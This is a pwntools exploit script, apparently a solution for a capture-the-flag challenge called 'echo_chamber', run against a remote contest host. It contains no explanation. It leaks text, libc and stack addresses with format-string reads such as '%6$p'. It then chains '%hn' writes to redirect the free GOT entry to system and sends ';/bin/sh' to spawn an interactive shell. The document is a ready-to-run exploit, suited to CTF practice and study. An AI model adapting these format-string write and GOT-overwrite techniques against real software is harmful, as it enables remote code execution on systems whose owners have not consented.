from pwn import *

DEBUG = 1
REMOTE = 1
cmd = """
pie breakpoint *0x114d
"""
context.terminal = "tmux splitw -h -f".split()

if REMOTE:
    p = remote('echochamber.uni.hctf.fun', 13374)
else:
    p = process("./echo_chamber", env={"LD_PRELOAD":"./libc.so.6"})

libc = ELF('./libc.so.6', checksec=False)
elf = ELF('./echo_chamber', checksec=False)

if DEBUG and not REMOTE:
    gdb.attach(p, cmd, gdb_args=["--init-eval-command='source /ctf/tools/gef/gef.py'"])
top_stack = 0

def overwrite_hn(rel_sp, new_n):
    p.sendline("%{}x%{}$hn".format(new_n, (rel_sp) / 4))

def overwrite_hhn(rel_sp, new_n):
    p.sendline("%{}x%{}$hhn".format(new_n, (rel_sp) / 4))

p.recvline()

p.sendline("%6$p")
leak = int(p.recv(), 16)
base_text = leak - 0x2025
print(hex(base_text))

p.sendline("%19$p")
leak = int(p.recv(), 16)
base_libc = leak - 109377
print(hex(base_libc))

libc.address = base_libc
elf.address = base_text

free_got = elf.got['free']
#free_got = elf.got['free']

free_got_high = free_got >> 16
free_got_low = free_got & 0xffff

p.sendline("%p")
leak = int(p.recv(), 16)
top_stack = leak - 40
print(hex(top_stack))

tmp_off = top_stack + 0x68
tmp_off_low = tmp_off & 0xffff
print("free_got {}".format(hex(free_got)))

#p.sendline("%25$s")
#leak = u32(p.recv()[:4].ljust(4, "\x00"))
#print(hex(leak))

system = libc.symbols['system']
print(system)
pause()
system_high = system >> 16
system_low = system & 0xffff

overwrite_hn(0x64, tmp_off_low)
overwrite_hn(244, free_got_low)
overwrite_hn(0x64, tmp_off_low + 2)
overwrite_hn(244, free_got_high)

overwrite_hn(0x64, tmp_off_low + 4)
overwrite_hn(244, free_got_low + 2)
overwrite_hn(0x64, tmp_off_low + 4 + 2)
overwrite_hn(244, free_got_high)

target = system
target_low = target & 0xffff
target_high = target >> 16
target_sisa = target_high - target_low
p.sendline("%{}x%{}$hn%{}x%{}$hn;/bin/sh\x00".format(target_low, 0x68 / 4, target_sisa, 0x6c / 4))

p.interactive()
